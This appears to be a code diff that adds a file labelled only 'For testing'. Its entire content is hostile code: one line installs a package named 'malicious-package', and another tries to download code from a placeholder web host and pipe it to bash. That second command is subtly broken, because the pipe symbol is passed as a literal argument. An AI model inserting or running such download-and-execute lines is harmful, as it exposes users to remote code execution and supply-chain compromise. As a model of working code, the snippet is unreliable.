@@ -1,0 +1,9 @@
+For testing
+
+
+import os
+os.system("pip install malicious-package")
+
+
+import subprocess
+subprocess.run(["curl", "-s", "http://insertnewusername.github.io/maliciouscode", "|", "bash"])
